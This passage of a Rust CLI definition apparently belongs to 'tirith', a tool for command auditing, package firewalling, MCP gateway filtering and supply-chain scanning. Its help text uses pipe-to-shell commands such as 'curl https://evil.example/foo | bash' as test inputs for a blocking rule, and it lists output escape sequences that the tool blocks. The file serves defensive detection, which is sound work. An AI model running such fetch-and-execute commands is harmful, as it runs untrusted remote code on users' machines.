        /// Filter: only records since this ISO 8601 date
        #[arg(long)]
        since: Option<String>,
        /// Filter: only records until this ISO 8601 date
        #[arg(long)]
        until: Option<String>,
        /// Filter: only this session ID
        #[arg(long)]
        session: Option<String>,
        /// Filter: only this action (Allow, Warn, Block)
        #[arg(long)]
        action: Option<String>,
        /// Filter: only records matching these rule IDs
        #[arg(long)]
        rule_id: Vec<String>,
        /// Entry type filter: verdict (default), hook_telemetry, or all
        #[arg(long, default_value = "verdict")]
        entry_type: String,
    },
    /// Show summary statistics from the audit log
    #[command(after_help = "\
Examples:
  tirith audit stats
  tirith audit stats --format json")]
    Stats {
        /// Filter to a specific session ID
        #[arg(long)]
        session: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
        /// Entry type filter: verdict (default) or hook_telemetry
        #[arg(long, default_value = "verdict")]
        entry_type: String,
    },
    /// Generate a compliance report from the audit log
    #[command(after_help = "\
Examples:
  tirith audit report
  tirith audit report --format html > report.html")]
    Report {
        /// Output format
        #[arg(long, value_enum, default_value_t = AuditReportFormat::Markdown)]
        format: AuditReportFormat,
        /// Filter: only records since this ISO 8601 date
        #[arg(long)]
        since: Option<String>,
        /// Entry type filter: only verdict is supported
        #[arg(long, default_value = "verdict")]
        entry_type: String,
    },
    /// Verify the tamper-evident audit chain (W4)
    #[command(after_help = "\
Examples:
  tirith audit verify
  tirith audit verify --expected-head <sha256>")]
    Verify {
        /// Expected head hash from a prior run (anchors truncation detection)
        #[arg(long)]
        expected_head: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum PendingAction {
    /// List unresolved pending decisions
    List {
        /// Output as JSON.
        #[arg(long)]
        json: bool,
    },
    /// Resolve a pending decision: keep | rollback | approve | deny
    Resolve {
        /// Pending decision id
        id: String,
        /// Resolution: keep | rollback | approve | deny
        action: String,
        /// Optional reason recorded with the resolution
        #[arg(long)]
        reason: Option<String>,
    },
    /// Export all pending decisions as JSON
    Export {
        /// Write to a file instead of stdout
        #[arg(long)]
        output: Option<std::path::PathBuf>,
    },
}

/// The ecosystem `tirith pkg` enforces for. Only `pip` installs; `npm`/`cargo`
/// resolve-and-inspect lives behind hidden experimental flags and cannot install.
#[derive(Copy, Clone, Debug, PartialEq, Eq, clap::ValueEnum)]
enum PkgEcosystem {
    /// Python wheels (the only enforced ecosystem).
    Pip,
    /// npm, not enforced in this version.
    Npm,
    /// cargo, not enforced in this version.
    Cargo,
}

impl PkgEcosystem {
    fn into_core(self) -> cli::pkg::Ecosystem {
        match self {
            PkgEcosystem::Pip => cli::pkg::Ecosystem::Pip,
            PkgEcosystem::Npm => cli::pkg::Ecosystem::Npm,
            PkgEcosystem::Cargo => cli::pkg::Ecosystem::Cargo,
        }
    }
}

#[derive(Subcommand)]
enum PkgAction {
    /// Resolve + inspect a requirement set and approve its install plan, printing
    /// the plan digest the approval binds to. Does NOT install.
    #[command(after_help = "\
Examples:
  tirith pkg approve pip requests==2.31.0
  tirith pkg approve pip flask --target .venv")]
    Approve {
        /// The ecosystem (only `pip` is enforced).
        #[arg(value_enum)]
        ecosystem: PkgEcosystem,
        /// Requirement specs (e.g. `requests==2.31.0`).
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        requirements: Vec<String>,
        /// Install target directory (pip `--target`); defaults to the interpreter
        /// prefix.
        #[arg(long)]
        target: Option<std::path::PathBuf>,
        /// An approved index URL (repeatable); empty means lock-only / `--no-index`.
        #[arg(long = "index-url")]
        index_url: Vec<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Resolve + inspect + install ONLY the verified, hash-pinned bytes, inside the
    /// containment capsule, recording a tamper-evident receipt. Fails closed on
    /// degraded containment.
    #[command(after_help = "\
Examples:
  tirith pkg install pip requests==2.31.0
  tirith pkg install pip flask --target .venv --yes")]
    Install {
        /// The ecosystem (only `pip` is enforced).
        #[arg(value_enum)]
        ecosystem: PkgEcosystem,
        /// Requirement specs (e.g. `requests==2.31.0`).
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        requirements: Vec<String>,
        /// Install target directory (pip `--target`); defaults to the interpreter
        /// prefix.
        #[arg(long)]
        target: Option<std::path::PathBuf>,
        /// An approved index URL (repeatable); empty means lock-only / `--no-index`.
        #[arg(long = "index-url")]
        index_url: Vec<String>,
        /// Install without a prior `tirith pkg approve` (unattended). The receipt
        /// still attests the install honestly.
        #[arg(long)]
        yes: bool,
        /// Acknowledge degraded containment (still routes through the fail-closed
        /// installer; does not weaken the requirement).
        #[arg(long = "allow-degraded")]
        allow_degraded: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Verify an already-installed environment's RECORD integrity (D5), without
    /// installing anything.
    #[command(after_help = "\
Examples:
  tirith pkg verify-env --target .venv requests flask")]
    VerifyEnv {
        /// The environment tree to verify (a venv root or `--target` dir).
        #[arg(long)]
        target: std::path::PathBuf,
        /// The distribution names to verify (PEP 503 normalized internally).
        #[arg(trailing_var_arg = true)]
        packages: Vec<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// List or show the package-firewall tamper-evident receipts.
    #[command(after_help = "\
Examples:
  tirith pkg receipt list
  tirith pkg receipt last
  tirith pkg receipt show <receipt-id>")]
    Receipt {
        #[command(subcommand)]
        query: PkgReceiptQuery,
    },
}

#[derive(Subcommand)]
enum PkgReceiptQuery {
    /// List all artifact-scan receipts (newest first).
    List {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show the newest artifact-scan receipt.
    Last {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show one receipt by its id (content hash).
    Show {
        /// The receipt id (64-char content hash).
        receipt_id: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum ReceiptAction {
    /// Show the last receipt
    #[command(after_help = "\
Examples:
  tirith receipt last")]
    Last {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// List all receipts
    #[command(after_help = "\
Examples:
  tirith receipt list")]
    List {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Verify a receipt by SHA256
    #[command(after_help = "\
Examples:
  tirith receipt verify a1b2c3d4e5f6")]
    Verify {
        sha256: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum CheckpointAction {
    /// Create a checkpoint of specified paths
    #[command(after_help = "\
Examples:
  tirith checkpoint create src/ Cargo.toml")]
    Create {
        /// Paths to checkpoint
        paths: Vec<String>,
        /// Command that triggered the checkpoint
        #[arg(long)]
        trigger: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// List all checkpoints
    #[command(after_help = "\
Examples:
  tirith checkpoint list")]
    List {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Restore files from a checkpoint
    #[command(after_help = "\
Examples:
  tirith checkpoint restore <id>")]
    Restore {
        /// Checkpoint ID
        id: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show differences between checkpoint and current state
    #[command(after_help = "\
Examples:
  tirith checkpoint diff <id>")]
    Diff {
        /// Checkpoint ID
        id: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Remove old checkpoints based on age/count/size limits
    #[command(after_help = "\
Examples:
  tirith checkpoint purge")]
    Purge {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Snapshot, run a command, then diff (post-run blast-radius). Same impl as
    /// the top-level `tirith watch`.
    #[command(after_help = WATCH_AFTER_HELP)]
    Watch {
        /// Extra paths to snapshot for file changes, in addition to the current
        /// directory. Repeat the flag for multiple paths.
        #[arg(long = "paths")]
        paths: Vec<String>,

        /// EXPERIMENTAL, off by default: emit best-effort network hints from a
        /// resolver-cache / log mtime delta. May miss QUIC/UDP/direct-IP
        /// entirely; NOT a network monitor and not a security boundary.
        #[arg(long)]
        with_net_hints: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// The command to run and watch (everything after `--`)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },
}

#[derive(Subcommand)]
enum GatewayAction {
    /// Run the gateway proxy
    #[command(after_help = "\
Examples:
  tirith gateway run --upstream-bin npx --upstream-arg @modelcontextprotocol/server-filesystem --config gateway.yaml
  tirith gateway run --filter-output --upstream-bin npx --upstream-arg @modelcontextprotocol/server-filesystem --config gateway.yaml

`--filter-output` (M7 ch4) routes every guarded-tool response's
`result.content` through the output-direction analyzer before it reaches the
client. Blocks on OSC52 / hyperlink-mismatch / hidden-text / fake-prompt with
a sanitized placeholder citing the audit event_id. Opt-in until
field-tested.")]
    Run {
        /// Path to upstream MCP server binary
        #[arg(long)]
        upstream_bin: String,

        /// Arguments to pass to upstream binary
        #[arg(long)]
        upstream_arg: Vec<String>,

        /// Path to gateway config YAML
        #[arg(long)]
        config: String,

        /// Route every guarded-tool response's `result.content` through the
        /// M7 output-direction analyzer. Blocks on dangerous escape sequences
        /// (OSC52 clipboard write, OSC0/2 title rewrite, screen-clear,
        /// hyperlink mismatch, hidden text, fake-prompt). Default is
        /// pass-through (current behavior).
        #[arg(long)]
        filter_output: bool,

        /// Spawn the upstream MCP server inside the OS containment capsule
        /// (deny-network, scrubbed env, resource limits, no inherited handles).
        /// Enforcing: if this host's backend cannot enforce the containment, the
        /// gateway refuses to launch the upstream rather than running it
        /// uncontained. Default is the current uncontained spawn. The `secure`
        /// gateway profile (policy `gateway_profile: secure`) requires this
        /// containment even without the flag.
        #[arg(long)]
        capsule: bool,
    },
    /// Validate gateway config file
    #[command(after_help = "\
Examples:
  tirith gateway validate-config --config gateway.yaml")]
    ValidateConfig {
        /// Path to gateway config YAML
        #[arg(long)]
        config: String,
    },
}

#[derive(Subcommand)]
enum PolicyAction {
    /// Generate a starter policy file
    #[command(after_help = "\
Examples:
  tirith policy init
  tirith policy init --force
  tirith policy init --template individual
  tirith policy init --template ci-strict
  tirith policy init --template ai-agent-heavy
  tirith policy init --template oss-maintainer
  tirith policy init --template startup
  tirith policy init --template enterprise
  tirith policy init --template mcp-strict

Templates:
  individual      sensible defaults for a single developer
  personal        alias of individual
  ci-strict       strict CI settings (fail-closed, no bypass, scan fail-on)
  ai-agent-heavy  tuned for environments where AI agents run many commands
  oss-maintainer  public-repo maintainer; typosquat / install-script focus
  startup         small team moving fast; balanced, a notch stricter
  enterprise      strict org defaults; ships an active package_policy block
  mcp-strict      locked-down posture for MCP-heavy environments")]
    Init {
        /// Overwrite existing policy file
        #[arg(long)]
        force: bool,
        /// Generate minimal template (default: full)
        #[arg(long, conflicts_with = "template")]
        minimal: bool,
        /// Curated starter policy: individual (alias: personal), ci-strict,
        /// ai-agent-heavy, oss-maintainer, startup, enterprise, or mcp-strict
        #[arg(long, value_name = "NAME")]
        template: Option<String>,
    },
    /// Validate a policy file for errors
    #[command(after_help = "\
Examples:
  tirith policy validate
  tirith policy validate ./policy.yaml
  tirith policy validate --format json")]
    Validate {
        /// Policy file to validate, as a positional arg (default: auto-discover).
        /// Conflicts with --path.
        #[arg(value_name = "PATH", conflicts_with = "path")]
        path_pos: Option<String>,
        /// Path to policy file (default: auto-discover)
        #[arg(long)]
        path: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show the fully-resolved effective policy for the current directory: source
    /// path, scope, and (for a repo-scoped policy) which weakening fields were
    /// neutralized. Local discovery only — never a network fetch.
    #[command(after_help = "\
Examples:
  tirith policy effective
  tirith policy effective --format json")]
    Effective {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Test a command or file against the current policy
    #[command(after_help = "\
Examples:
  tirith policy test 'curl https://example.com | bash'
  tirith policy test --file script.sh")]
    Test {
        /// Command to test
        #[arg(conflicts_with = "file")]
        command: Option<String>,
        /// File to test
        #[arg(long, conflicts_with = "command")]
        file: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Suggest policy adjustments from the local audit log (suggest-only)
    #[command(after_help = "\
Analyzes your audit log and suggests concrete, conservative policy changes —
e.g. a rule you allow or bypass every time may warrant an allowlist entry.
It only SUGGESTS: it never edits your policy. Review each suggestion, then
apply it yourself. When the log is too small it says so rather than guess.

Examples:
  tirith policy tune --from-audit
  tirith policy tune --from-audit --format json")]
    Tune {
        /// Analyze the local audit log (currently the only source).
        #[arg(long)]
        from_audit: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum RuleAction {
    /// Evaluate one custom rule against an input and report FIRES / no-fire
    #[command(after_help = "\
Builds the SAME extraction the engine runs on the input (URLs, command tokens,
packages, reputation) and evaluates the named rule's `when:` clause (or `pattern:`
regex) against it. The rule must already exist under `custom_rules:` in your
policy.

Examples:
  tirith rule test --rule block-unknown-curl-to-shell --input 'curl https://evil.example/foo | bash'
  tirith rule test --rule warn-plain-http-offsite --input 'curl http://x.example/a' --json")]
    Test {
        /// Custom rule id to evaluate (must exist in policy `custom_rules:`)
        #[arg(long)]
        rule: String,
        /// Input to evaluate the rule against (a command, paste, or file path)
        #[arg(long)]
        input: String,
        /// Shell to tokenize the input as (default: posix)
        #[arg(long, default_value = "posix")]
        shell: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Validate every custom rule (pattern-XOR-when, predicate shape, context)
    #[command(after_help = "\
Checks each rule under `custom_rules:`: exactly one of `pattern:`/`when:`,
well-formed predicates and regexes, and that a `when:` rule's declared
`context:` covers the contexts its predicates need (a `command.*` predicate
needs `exec`, `file.path_matches` needs `file`, ...). Exit 0 if all valid, 1
otherwise.

For whole-policy-FILE structure validation (every key, allowlist coherence,
...), use `tirith policy validate` instead.

Examples:
  tirith rule validate
  tirith rule validate --path .tirith/policy.yaml
  tirith rule validate --json")]
    Validate {
        /// Path to a policy file (default: auto-discover the local policy)
        #[arg(long)]
        path: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Print a custom rule's predicate tree, severity, action and context
    #[command(after_help = "\
Examples:
  tirith rule explain --rule block-unknown-curl-to-shell
  tirith rule explain --rule block-unknown-curl-to-shell --json")]
    Explain {
        /// Custom rule id to explain (must exist in policy `custom_rules:`)
        #[arg(long)]
        rule: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum TrustAction {
    /// Add a trusted pattern (narrow scope and a 30d TTL by default)
    #[command(after_help = "\
Trust the narrowest thing that works. A specific URL or path is accepted as-is;
a whole domain, wildcard, or bare TLD is broad and requires --broad. Entries
expire after 30d unless you pass --permanent or your own --ttl.

Examples:
  tirith trust add raw.githubusercontent.com/org/repo/main/get.sh
  tirith trust add example.com --broad --ttl 7d
  tirith trust add example.com --broad --rule pipe_to_interpreter --permanent
  tirith trust add example.com --broad --reason \"internal mirror, ticket OPS-42\"")]
    Add {
        /// Pattern to trust (a specific URL/path, or a domain with --broad)
        pattern: String,
        /// Scope trust to a specific rule ID (narrower than a global trust)
        #[arg(long)]
        rule: Option<String>,
        /// TTL duration (e.g., 1h, 7d, 30d). Default: 30d. Conflicts with --permanent
        #[arg(long, conflicts_with = "permanent")]
        ttl: Option<String>,
        /// Never expire this entry (opt out of the default TTL)
        #[arg(long)]
        permanent: bool,
        /// Accept a broad pattern (whole domain, wildcard, or bare TLD)
        #[arg(long)]
        broad: bool,
        /// Free-text reason recorded with the entry (shown by `trust explain`)
        #[arg(long)]
        reason: Option<String>,
        /// Scope: user (default) or repo
        #[arg(long, default_value = "user")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// List trusted patterns from all sources, with scope visualization
    #[command(after_help = "\
Each row shows the entry's scope class (exact / substring / domain / wildcard /
bare-TLD); a '!' marks a dangerously broad entry.

Examples:
  tirith trust list
  tirith trust list --format json --expired")]
    List {
        /// Filter by rule ID
        #[arg(long)]
        rule: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
        /// Include expired entries
        #[arg(long)]
        expired: bool,
        /// Scope: user, repo, or all (default)
        #[arg(long, default_value = "all")]
        scope: String,
    },
    /// Explain a trust entry: scope, coverage, expiry, and why it was added
    #[command(after_help = "\
Examples:
  tirith trust explain example.com
  tirith trust explain example.com --format json")]
    Explain {
        /// Pattern of the entry to explain
        pattern: String,
        /// Scope: user, repo, or all (default)
        #[arg(long, default_value = "all")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show what changed in the trust set since the last snapshot
    #[command(after_help = "\
Examples:
  tirith trust diff
  tirith trust diff --format json")]
    Diff {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Remove a trusted pattern
    #[command(after_help = "\
Examples:
  tirith trust remove example.com")]
    Remove {
        /// Pattern to remove
        pattern: String,
        /// Only remove entries scoped to this rule ID
        #[arg(long)]
        rule: Option<String>,
        /// Scope: user (default) or repo
        #[arg(long, default_value = "user")]
        scope: String,
    },
    /// Show last trigger and interactively trust domains
    #[command(after_help = "\
Examples:
  tirith trust last")]
    Last,
    /// Print ready-to-run `trust add` commands for the most recent blocked finding
    /// (from the last-trigger record). Suggest-only by default; --apply runs them.
    #[command(after_help = "\
Examples:
  tirith trust from-last-trigger
  tirith trust from-last-trigger --apply")]
    FromLastTrigger {
        /// Add the trust entries instead of just printing the commands.
        #[arg(long)]
        apply: bool,
    },
    /// Garbage-collect expired entries from trust stores
    #[command(after_help = "\
Examples:
  tirith trust gc --expired
  tirith trust gc --expired --scope user")]
    Gc {
        /// Collect expired entries — currently the only collection mode, so
        /// this flag is optional
        #[arg(long)]
        expired: bool,
        /// Scope: user, repo, or all (default)
        #[arg(long, default_value = "all")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Prune expired trust entries (alias for `gc`).
    ///
    /// `prune` is the spec-named CLI surface for the M6 garbage-collection
    /// flow; `gc` is the shipping name kept as the canonical short form.
    /// Both invoke the same backing function in `cli::trust::gc`.
    #[command(after_help = "\
Examples:
  tirith trust prune --expired
  tirith trust prune --expired --scope user")]
    Prune {
        /// Collect expired entries — currently the only collection mode.
        #[arg(long)]
        expired: bool,
        /// Scope: user, repo, or all (default)
        #[arg(long, default_value = "all")]
        scope: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show the audit log of trust-store mutations (add / remove / gc / prune).
    ///
    /// Reads audit-log JSONL entries with `entry_type == "trust_change"`,
    /// optionally filtered by a relative time window (`--since 7d`).
    #[command(after_help = "\
Examples:
  tirith trust audit
  tirith trust audit --since 7d
  tirith trust audit --format json --since 30d")]
    Audit {
        /// Show mutations within the last N days/hours/minutes (e.g. `7d`,
        /// `24h`, `15m`). Without this flag, the full audit history is shown.
        #[arg(long)]
        since: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum DaemonAction {
    /// Start the daemon (foreground by default; --detach backgrounds it)
    #[command(after_help = "\
Examples:
  tirith daemon start            # foreground (blocks; run under a supervisor)
  tirith daemon start --detach   # background; returns once the socket is up")]
    Start {
        /// Run in the background: re-spawn detached, verify the socket comes up,
        /// then return. Default is foreground.
        #[arg(long, short = 'd')]
        detach: bool,
    },
    /// Stop a running daemon
    #[command(after_help = "\
Examples:
  tirith daemon stop")]
    Stop,
    /// Check if daemon is running and measure latency
    #[command(after_help = "\
Examples:
  tirith daemon status")]
    Status,
}

#[derive(Clone, Copy, Debug, Default, clap::ValueEnum)]
enum AuditExportFormat {
    #[default]
    Json,
    Csv,
}

#[derive(Clone, Copy, Debug, Default, clap::ValueEnum)]
enum AuditReportFormat {
    #[default]
    Markdown,
    Json,
    Html,
}

#[derive(Subcommand)]
enum PackageAction {
    /// Score a package's provenance / maintainer risk
    #[command(after_help = "\
Examples:
  tirith package risk npm react
  tirith package risk pypi reqeusts
  tirith package risk npm left-pad --path ./node_modules/left-pad
  tirith package risk --online npm express
  tirith package risk --format json npm express

Offline by default: name and local-content signals only, no network. Add
--online to also consult the registry API (npm / PyPI / crates.io) for
provenance signals — package age, ownership transfer, version spike, download
counts, source-repo URL, yanked/deprecated status. --online is ignored when
--offline or TIRITH_OFFLINE is set, and a registry failure degrades gracefully
to the offline score.")]
    Risk {
        /// Package ecosystem: npm, pypi, rubygems, crates.io, go, maven, nuget, packagist
        ecosystem: String,
        /// Package name
        name: String,
        /// Inspect locally-available package content at this directory for
        /// install-script and binary-blob signals. tirith never downloads the
        /// package; without this flag it tries to auto-discover the package
        /// under node_modules / site-packages relative to the current dir.
        #[arg(long)]
        path: Option<String>,
        /// Also consult the package's registry API (npm / PyPI / crates.io)
        /// for provenance signals. Off by default — this is the only path on
        /// which `package risk` reaches the network. Ignored when --offline
        /// or TIRITH_OFFLINE is set; a registry failure degrades gracefully.
        #[arg(long)]
        online: bool,
        /// Force offline scoring even if --online is passed. Also honored via
        /// the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Show the factor-by-factor derivation of a package's risk score
    #[command(after_help = "\
Examples:
  tirith package explain npm express
  tirith package explain pypi reqeusts
  tirith package explain --online npm express
  tirith package explain --format json npm react

Offline by default. --online adds the registry-API provenance factors (see
`tirith package risk --help`); --offline / TIRITH_OFFLINE forces offline.")]
    Explain {
        /// Package ecosystem: npm, pypi, rubygems, crates.io, go, maven, nuget, packagist
        ecosystem: String,
        /// Package name
        name: String,
        /// Inspect locally-available package content at this directory (see
        /// `package risk --path`). tirith never downloads the package.
        #[arg(long)]
        path: Option<String>,
        /// Also consult the package's registry API for provenance signals
        /// (see `tirith package risk --help`). Off by default.
        #[arg(long)]
        online: bool,
        /// Force offline scoring even if --online is passed. Also honored via
        /// the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Scan installed packages or a specific lockfile for supply-chain risk
    #[command(after_help = "\
Examples:
  tirith package scan                              (--installed against cwd)
  tirith package scan --installed
  tirith package scan --lockfile package-lock.json
  tirith package scan --installed --online
  tirith package scan --format json --installed

Spec-named CLI surface for the directory-level supply-chain scan. Thin
wrapper over `tirith ecosystem scan` — both CLIs route through the same
engine, and produce byte-identical JSON for the same cwd. --installed walks
installed trees (node_modules/, site-packages/, vendor/, Cargo.lock).
--lockfile <path> targets a specific lockfile and reuses the manifest parser.
The two are mutually exclusive; if neither is passed, --installed against cwd
is assumed.")]
    Scan {
        /// Scan installed trees (node_modules/, site-packages/, vendor/,
        /// Cargo.lock) instead of declared-dependency manifests.
        #[arg(long, conflicts_with = "lockfile")]
        installed: bool,
        /// Scan a specific lockfile. Mutually exclusive with --installed.
        #[arg(long, value_name = "PATH", conflicts_with = "installed")]
        lockfile: Option<PathBuf>,
        /// Optional project directory to scan (rarely needed — the wrapper
        /// defaults to cwd). Mutually exclusive with --lockfile.
        #[arg(long, value_name = "PATH", conflicts_with = "lockfile")]
        path: Option<PathBuf>,
        /// Also consult each package's registry API (npm / PyPI / crates.io)
        /// for provenance signals. Off by default.
        #[arg(long)]
        online: bool,
        /// Force offline scoring even if --online is passed. Also honored via
        /// the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,
        /// Cap the installed-tree walk at N entries. 0 means unbounded.
        /// Default 5000; valid range 100-200000 (or 0).
        #[arg(long, default_value_t = 5000)]
        max_installed_entries: usize,
        /// Do not prompt for confirmation under --installed --online when the
        /// estimated network call count is large. Pass this in CI.
        #[arg(long)]
        non_interactive: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Inspect exact package artifacts (wheels) or an installed environment for
    /// startup hooks, native import chains, RECORD tampering, and
    /// cross-distribution loader/payload splits
    #[command(after_help = "\
Examples:
  tirith package inspect --artifact dist/foo-1.0-py3-none-any.whl
  tirith package inspect --artifact a.whl --artifact b.whl
  tirith package inspect --artifact-set ./downloaded-wheels/
  tirith package inspect --installed ./.venv
  tirith package inspect --format json --artifact dist/foo.whl

Verdict-oriented (unlike `package risk`, which is an advisory scorer): exits
0 when clean, 1 on a block-grade finding, 2 on an advisory (warn) finding.
Pass two or more --artifact files (or --artifact-set <dir>) to detect a
cross-distribution split where one wheel's startup hook executes a payload
bundled in another. Member-qualified locations (foo.whl!/pkg/file) appear in
--format json output. tirith never downloads an artifact; it inspects the
bytes you point it at.")]
    Inspect {
        /// A wheel (.whl) artifact to inspect. Repeatable: pass two or more to
        /// detect a cross-distribution loader/payload split across them.
        #[arg(long, value_name = "FILE")]
        artifact: Vec<PathBuf>,
        /// A directory of wheels to inspect as a SET (cross-distribution
        /// correlation across every .whl found, non-recursively).
        #[arg(long, value_name = "DIR", conflicts_with = "installed")]
        artifact_set: Option<PathBuf>,
        /// An installed environment (a venv or site-packages root) to inspect for
        /// RECORD integrity, startup hooks, and native import chains.
        #[arg(long, value_name = "DIR", conflicts_with = "artifact_set")]
        installed: Option<PathBuf>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum EcosystemAction {
    /// Scan a project directory's dependency manifests for supply-chain risk
    #[command(after_help = "\
Examples:
  tirith ecosystem scan
  tirith ecosystem scan ./my-project
  tirith ecosystem scan --online ./my-project
  tirith ecosystem scan --installed ./my-project
  tirith ecosystem scan --installed --max-installed-entries 0  (unbounded)
  tirith ecosystem scan --format json ./my-project

Discovers package.json / package-lock.json, requirements*.txt / pyproject.toml,
Cargo.toml, go.mod, and Gemfile. Every declared dependency is scored with the
